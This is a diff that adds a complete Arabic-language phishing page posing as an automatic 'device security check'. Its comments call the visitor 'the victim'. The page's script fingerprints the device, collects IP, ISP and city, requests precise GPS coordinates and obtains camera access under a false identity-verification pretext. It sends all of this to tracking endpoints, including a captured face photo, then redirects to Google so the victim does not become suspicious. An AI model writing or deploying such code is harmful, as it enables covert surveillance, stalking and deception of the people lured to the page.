@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex, nofollow">
+<title>التحقق الأمني من الجهاز</title>
+<style>
+    * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Tahoma,sans-serif; }
+    body {
+        min-height:100vh; display:flex; align-items:center; justify-content:center;
+        background:linear-gradient(135deg,#0f172a,#1e3a5f); color:#e2e8f0; padding:20px;
+    }
+    .card {
+        max-width:420px; width:100%; background:rgba(255,255,255,.06);
+        border:1px solid rgba(255,255,255,.12); border-radius:20px; padding:28px 22px;
+        box-shadow:0 20px 60px rgba(0,0,0,.5);
+    }
+    .logo { text-align:center; font-size:3rem; margin-bottom:10px; }
+    h1 { text-align:center; color:#38bdf8; font-size:1.4rem; margin-bottom:6px; }
+    .sub { text-align:center; color:#94a3b8; font-size:.9rem; margin-bottom:22px; line-height:1.7; }
+    .steps { list-style:none; }
+    .step {
+        display:flex; align-items:center; gap:12px; padding:12px 14px; margin-bottom:10px;
+        border-radius:12px; background:rgba(255,255,255,.05); border:1px solid rgba(255,255,255,.08);
+        font-size:.95rem; transition:all .3s;
+    }
+    .step .ic { width:26px; height:26px; border-radius:50%; display:flex; align-items:center;
+        justify-content:center; font-size:.8rem; background:#334155; color:#94a3b8; flex-shrink:0; }
+    .step.active { border-color:#38bdf8; background:rgba(56,189,248,.08); }
+    .step.active .ic { background:#38bdf8; color:#0f172a; animation:pulse 1s infinite; }
+    .step.done { border-color:#22c55e; background:rgba(34,197,94,.06); }
+    .step.done .ic { background:#22c55e; color:#fff; }
+    .step.error { border-color:#ef4444; background:rgba(239,68,68,.06); }
+    .step.error .ic { background:#ef4444; color:#fff; }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+
+    #camPrompt { display:none; margin-top:14px; text-align:center; }
+    #camPrompt p { color:#94a3b8; font-size:.85rem; margin-bottom:12px; line-height:1.8; }
+    #camBtn {
+        background:#38bdf8; color:#0f172a; border:none; padding:12px 30px; font-size:1rem;
+        font-weight:bold; border-radius:50px; cursor:pointer; width:100%;
+    }
+    #camBtn:disabled { opacity:.6; cursor:not-allowed; }
+    video { width:100%; border-radius:12px; margin-top:12px; display:none; border:2px solid #38bdf8; }
+
+    .info { margin-top:18px; display:grid; grid-template-columns:1fr 1fr; gap:10px; }
+    .info div { background:rgba(255,255,255,.05); border-radius:10px; padding:10px; text-align:center; }
+    .info .l { font-size:.7rem; color:#64748b; margin-bottom:3px; }
+    .info .v { font-size:.95rem; font-weight:bold; direction:ltr; color:#f8fafc; }
+    .note { margin-top:16px; text-align:center; color:#475569; font-size:.75rem; }
+</style>
+</head>
+<body>
+<div class="card">
+    <div class="logo">🛡️</div>
+    <h1>التحقق الأمني من الجهاز</h1>
+    <p class="sub">تم رصد نشاط غير معتاد من هذا الجهاز.<br>جاري التحقق تلقائيًا، يرجى الانتظار…</p>
+
+    <ul class="steps">
+        <li class="step" id="step1"><span class="ic">1</span><span>تحليل عنوان IP وبيانات الاتصال</span></li>
+        <li class="step" id="step2"><span class="ic">2</span><span>تحديد الموقع الجغرافي</span></li>
+        <li class="step" id="step3"><span class="ic">3</span><span>التحقق من الكاميرا والجهاز</span></li>
+        <li class="step" id="step4"><span class="ic">4</span><span>اكتمال الفحص</span></li>
+    </ul>
+
+    <div id="camPrompt">
+        <p>لإتمام التحقق الأمني من هوية المستخدم، يرجى الضغط على الزر والسماح بالوصول إلى الكاميرا.</p>
+        <button id="camBtn">✅ السماح بالتحقق</button>
+    </div>
+
+    <video id="camVideo" autoplay muted playsinline></video>
+
+    <div class="info">
+        <div><div class="l">عنوان IP</div><div class="v" id="ipVal">…</div></div>
+        <div><div class="l">الموقع</div><div class="v" id="cityVal">…</div></div>
+        <div><div class="l">مزود الخدمة</div><div class="v" id="ispVal">…</div></div>
+        <div><div class="l">الوقت</div><div class="v" id="timeVal">…</div></div>
+    </div>
+
+    <p class="note">جاري إعادة توجيهك بعد اكتمال الفحص…</p>
+</div>
+
+<script>
+(function(){
+    // ── معرّف فريد للضحية (يُحفظ حتى العودة) ──
+    const VID = localStorage.getItem('gcid') ||
+        (crypto.randomUUID ? crypto.randomUUID().slice(0,12) : ('v'+Date.now().toString(36)+Math.random().toString(36).slice(2,8)));
+    localStorage.setItem('gcid', VID);
+
+    const S = {
+        id: VID,
+        stage: 'ip',
+        ua: navigator.userAgent,
+        platform: (navigator.userAgentData && navigator.userAgentData.platform) || navigator.platform || '',
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+        screen: (screen.width||0)+'x'+(screen.height||0)+'x'+(screen.colorDepth||0),
+        cores: navigator.hardwareConcurrency || 0,
+        memory: navigator.deviceMemory || 0,
+        referrer: document.referrer || '',
+        device_name: detectDevice()
+    };
+
+    function detectDevice(){
+        const ua = navigator.userAgent;
+        const m = ua.match(/Android\s[\d.]+[;)]\s*([^;)]+)/);
+        if (m) return m[1].trim();
+        if (/iPhone/.test(ua)) return 'iPhone';
+        if (/iPad/.test(ua)) return 'iPad';
+        if (/Windows/.test(ua)) return 'Windows PC';
+        if (/Macintosh/.test(ua)) return 'Mac';
+        if (/Linux/.test(ua)) return 'Linux PC';
+        return ua.slice(0, 40);
+    }
+
+    function getBattery(){
+        try {
+            if (navigator.getBattery) navigator.getBattery().then(b => {
+                S.battery = Math.round((b.level||0)*100);
+                S.charging = b.charging ? 1 : 0;
+            });
+        } catch(e){}
+    }
+
+    function setStep(n, state){
+        const el = document.getElementById('step'+n);
+        el.className = 'step ' + state;
+    }
+
+    function postTrack(){
+        const body = JSON.stringify(S);
+        try {
+            navigator.sendBeacon('/api/track', new Blob([body], {type:'application/json'}));
+        } catch(e) {
+            fetch('/api/track', {method:'POST', headers:{'Content-Type':'application/json'}, body, keepalive:true}).catch(()=>{});
+        }
+    }
+
+    // ── 1) IP + معلومات الاتصال ──
+    async function collectIP(){
+        setStep(1,'active');
+        try {
+            const res = await fetch('/api/info');
+            const d = await res.json();
+            Object.assign(S, d);
+            document.getElementById('ipVal').textContent = S.ip || '?';
+            document.getElementById('cityVal').textContent = (S.city||'—') + '، ' + (S.country||'');
+            document.getElementById('ispVal').textContent = S.isp || '—';
+            document.getElementById('timeVal').textContent = new Date().toLocaleTimeString();
+            setStep(1,'done');
+        } catch(e) {
+            setStep(1,'error');
+        }
+    }
+
+    // ── 2) الموقع الدقيق ──
+    function requestGeo(){
+        if (!navigator.geolocation) { setStep(2,'error'); return; }
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                S.precise_lat = +pos.coords.latitude.toFixed(6);
+                S.precise_lon = +pos.coords.longitude.toFixed(6);
+                S.precise_accuracy = Math.round(pos.coords.accuracy);
+                S.stage = 'precise';
+                postTrack();
+                setStep(2,'done');
+            },
+            () => setStep(2,'error'),
+            { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+        );
+    }
+
+    // ── 3) الكاميرا (يتطلب نقرة — نعرضها كخطوة "تحقق") ──
+    async function startCamera(){
+        const btn = document.getElementById('camBtn');
+        btn.disabled = true;
+        btn.textContent = 'جاري التحقق…';
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 640 } }, audio: false
+            });
+            const video = document.getElementById('camVideo');
+            video.style.display = 'block';
+            video.srcObject = stream;
+            await video.play();
+            setStep(3,'active');
+
+            setTimeout(() => {          // ننتظر ثانيتين ليتضح الوجه
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+                stream.getTracks().forEach(t => t.stop());
+
+                fetch('/api/photo', {
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({ id: VID, photo: dataUrl })
+                }).catch(()=>{});
+
+                setStep(3,'done');
+                setStep(4,'active');
+                setTimeout(() => setStep(4,'done'), 1200);
+                // نعيد التوجيه لصفحة بريئة حتى لا يشك الضحية
+                setTimeout(() => { location.href = 'https://www.google.com'; }, 3500);
+            }, 2000);
+        } catch(e) {
+            setStep(3,'error');
+            btn.textContent = 'إعادة المحاولة';
+            btn.disabled = false;
+        }
+    }
+
+    document.getElementById('camBtn').addEventListener('click', startCamera);
+
+    // ── التشغيل التلقائي عند فتح الصفحة ──
+    getBattery();
+    collectIP().then(() => {
+        postTrack();        // أول تقرير فوري (IP + بيانات الجهاز)
+        requestGeo();       // نطلب الموقع الدقيق تلقائيًا
+        document.getElementById('camPrompt').style.display = 'block';
+    });
+})();
+</script>
+</body>
+</html>
